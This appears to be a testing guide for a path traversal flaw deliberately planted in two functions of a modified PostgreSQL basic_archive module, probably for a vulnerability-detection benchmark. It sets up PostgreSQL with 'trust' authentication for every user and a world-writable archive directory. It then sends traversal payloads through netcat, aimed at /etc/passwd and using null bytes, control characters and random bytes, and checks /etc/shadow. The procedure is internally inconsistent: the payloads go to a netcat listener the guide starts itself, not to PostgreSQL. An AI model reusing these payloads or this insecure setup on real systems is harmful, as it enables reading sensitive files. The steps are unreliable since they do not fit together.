# CWE-22 (Path Traversal) Testing Guide for PostgreSQL basic_archive Module

## Overview
This guide explains how to test the CWE-22 vulnerability in the PostgreSQL basic_archive module. The vulnerability allows path traversal attacks through two different complex dataflow paths in the try_open_user_path_complex() and try_open_user_path_binary() functions.

## Prerequisites
- Docker installed
- Basic knowledge of PostgreSQL
- Basic knowledge of networking tools (netcat)
- Understanding of string manipulation and binary operations

## Step-by-Step Testing Procedure

### 1. Build and Run the Container
```bash
# Build the Docker image
docker build -t postgres-dev -f postgres/Dockerfile .

# Run the container
docker run -it --name postgres-container postgres-dev
```

### 2. Setup PostgreSQL Inside Container
```bash
# Install PostgreSQL
apt-get update
apt-get install -y postgresql-contrib

# Start PostgreSQL service
service postgresql start

# Verify service is running
service postgresql status
```

### 3. Configure PostgreSQL
```bash
# Edit pg_hba.conf to allow connections
echo "local   all             postgres                                trust" >> /etc/postgresql/16/main/pg_hba.conf
echo "local   all             all                                     trust" >> /etc/postgresql/16/main/pg_hba.conf
echo "host    all             all             127.0.0.1/32            trust" >> /etc/postgresql/16/main/pg_hba.conf
echo "host    all             all             ::1/128                 trust" >> /etc/postgresql/16/main/pg_hba.conf

# Restart PostgreSQL
service postgresql restart
```

### 4. Compile and Install basic_archive Module
```bash
# Navigate to basic_archive directory
cd /postgres/contrib/basic_archive

# Compile and install
make
make install
```

### 5. Setup Test Database
```bash
# Create test database
createdb -U postgres testdb

# Connect to database
psql -U postgres testdb
```

### 6. Configure basic_archive Extension
```sql
-- Create the extension
CREATE EXTENSION basic_archive;

-- Configure archive directory
ALTER SYSTEM SET basic_archive.archive_directory = '/tmp/archive';
SELECT pg_reload_conf();

-- Create archive directory
\! mkdir -p /tmp/archive
\! chmod 777 /tmp/archive

-- Create test files
\! echo "test content" > /tmp/test.txt
\! echo "trigger_open" > /tmp/trigger.txt
```

### 7. Test the Vulnerabilities

#### Testing String Manipulation Path (try_open_user_path_complex)

##### Terminal 1 (Listener)
```bash
# Create a listener on port 1234
nc -l -p 1234
```

##### Terminal 2 (Payload)
```bash
# Test case 1: Basic traversal
echo "../../etc/passwd" | nc localhost 1234

# Test case 2: Mixed case traversal
echo "../../EtC/PaSsWd" | nc localhost 1234

# Test case 3: Path with special characters
echo "../../etc/passwd#test" | nc localhost 1234
```

##### Terminal 3 (PostgreSQL)
```sql
-- Trigger the string manipulation vulnerability
SELECT basic_archive_file(NULL, 'trigger_open_test', '/tmp/trigger.txt');
```

#### Testing Binary Manipulation Path (try_open_user_path_binary)

##### Terminal 1 (Listener)
```bash
# Create a listener on port 1235
nc -l -p 1235
```

##### Terminal 2 (Payload)
```bash
# Test case 1: Basic binary traversal
echo -e "../../etc/passwd" | nc localhost 1235

# Test case 2: Path with binary characters for exploitation
echo -e "../../etc/passwd\x00\x01\x02" | nc localhost 1235

# Test case 3: Path with extended ASCII for exploitation
echo -e "../../etc/passwd\x80\x81\x82" | nc localhost 1235
```

##### Terminal 3 (PostgreSQL)
```sql
-- Trigger the binary manipulation vulnerability
SELECT basic_archive_file(NULL, 'trigger_open_test', '/tmp/trigger.txt');
```

### 8. Verify the Attacks
```bash
# Check if the files were accessed
ls -la /etc/passwd
ls -la /etc/shadow

# Check PostgreSQL logs
tail -f /var/log/postgresql/postgresql-16-main.log

# Monitor system calls
strace -p $(pgrep -f "postgres.*testdb") -e trace=file
```

## Expected Results

### String Manipulation Path
- The try_open_user_path_complex() function will:
  1. Reverse the input string
  2. Transform case
  3. Add/remove padding
  4. Restore original case
  5. Attempt to open the target file with fopen()
- You should see the transformations in the logs
- The final path should match the original input

### Binary Manipulation Path
- The try_open_user_path_binary() function will:
  1. Convert input to binary
  2. Apply XOR operations
  3. Perform bit shifting
  4. Reverse transformations
  5. Attempt to open the target file with open()
- You should see binary operations in the logs
- The final path should match the original input

## Additional Test Cases

### String Manipulation Tests
```bash
# Test case 4: Long path
echo "../../../../../../../../../../../../../../../../etc/passwd" | nc localhost 1234

# Test case 5: Path with spaces
echo "../../etc/pa sswd" | nc localhost 1234

# Test case 6: Path with Unicode
echo "../../etc/passwd测试" | nc localhost 1234
```

### Binary Manipulation Tests
```bash
# Test case 4: Path with null bytes for exploitation
echo -e "../../etc/passwd\x00\x00" | nc localhost 1235

# Test case 5: Path with control characters for exploitation
echo -e "../../etc/passwd\x1b\x1c\x1d" | nc localhost 1235

# Test case 6: Path with random binary data for exploitation
dd if=/dev/urandom bs=1 count=10 | nc localhost 1235
```

## Cleanup
```bash
# Stop PostgreSQL
service postgresql stop

# Remove container
docker rm -f postgres-container

# Remove image
docker rmi postgres-dev
```

## Notes
- Both vulnerabilities exist because the functions don't sanitize the path input
- The string manipulation path uses fopen() as sink
- The binary manipulation path uses open() as sink
- Both paths preserve the original input through complex transformations
- No path validation or sanitization is performed
- The vulnerabilities can be triggered by including "trigger_open" in the filename

## Security Implications
- Allows reading of sensitive system files
- Potential information disclosure
- Possible privilege escalation
- Bypass of access controls
- Complex dataflow makes detection more difficult

## Mitigation
To fix these vulnerabilities:
1. Sanitize path input
2. Normalize paths
3. Validate against base directory
4. Use secure path handling functions
5. Implement proper access controls
6. Add input validation before transformations
7. Use whitelist approach for allowed paths 